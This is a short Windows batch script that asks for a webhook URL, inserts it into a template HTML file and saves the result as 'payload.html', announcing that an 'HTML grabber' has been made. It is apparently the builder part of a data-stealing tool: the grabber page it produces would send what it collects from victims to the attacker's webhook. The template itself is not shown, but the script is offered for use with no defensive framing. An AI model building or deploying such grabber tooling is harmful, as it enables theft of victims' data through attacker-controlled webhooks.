@echo off
setlocal enabledelayedexpansion

set "search=WEBHOOK-HERE"
set /p webhook=Enter in your webhook: 
set "replace=!webhook!"

set "file=template.html"
set "outputFile=payload.html"

(
    for /f "delims=" %%a in ('type "%file%"') do (
        set "line=%%a"
        set "line=!line:%search%=%replace%!"
        echo(!line!
    )
) > "%outputFile%"

echo HTML grabber made! Exiting program in 5 seconds...
timeout /nobreak /t 5 >nul

endlocal
